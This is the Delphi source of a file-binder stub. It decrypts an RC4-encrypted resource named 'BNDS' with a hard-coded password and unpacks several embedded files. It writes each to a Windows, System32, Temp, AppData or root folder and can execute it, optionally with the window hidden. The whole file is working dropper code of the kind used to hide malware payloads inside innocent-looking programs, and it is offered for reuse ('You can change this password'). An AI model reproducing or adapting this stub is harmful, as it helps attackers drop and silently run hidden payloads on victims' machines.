program Stub;
                
{$IMAGEBASE $3450089}

uses
  Windows, UnitFunctions, UnitRC4;
   
const
  EncryptionPassword = '8lsrqxBIH5POLjvBmTAz3nY4dVXTLLnAvroM2WT5'; //You can change this password
var
  TmpStr, Buffer,
  Filename, FilePath: string;
  FileSize: Int64;
  Path, i: Integer;
  Execute, Hidden: Boolean;
begin
  TmpStr := GetResourceAsString('BNDS');
  TmpStr := EnDecryptText(TmpStr, EncryptionPassword);

  while TmpStr <> '' do
  begin
    Filename := Copy(TmpStr, 1, Pos('|', TmpStr) - 1);
    Delete(TmpStr, 1, Pos('|', TmpStr));
    Path := StrToInt(Copy(TmpStr, 1, Pos('|', TmpStr) - 1));
    Delete(TmpStr, 1, Pos('|', TmpStr));
    Hidden := MyStrToBool(Copy(TmpStr, 1, Pos('|', TmpStr) - 1));
    Delete(TmpStr, 1, Pos('|', TmpStr));
    Execute := MyStrToBool(Copy(TmpStr, 1, Pos('|', TmpStr) - 1));
    Delete(TmpStr, 1, Pos('|', TmpStr));
    FileSize := StrToInt(Copy(TmpStr, 1, Pos('|', TmpStr) - 1));
    Delete(TmpStr, 1, Pos('|', TmpStr));
    Buffer := Copy(TmpStr, 1, FileSize);
    Delete(TmpStr, 1, FileSize);

    case Path of
      0: FilePath := RootDir + Filename;
      1: FilePath := WinDir + Filename;
      2: FilePath := SysDir + Filename;
      3: FilePath := TmpDir + Filename;
      4: FilePath := AppDataDir + Filename;
    end;

    MyCreateFile(FilePath, Buffer, Length(Buffer));

    if FileExists(FilePath) then 
    if Execute = True then
    if Hidden then MyShellExecute(FilePath, '', 0) else MyShellExecute(FilePath, '', 1);
  end;
end.
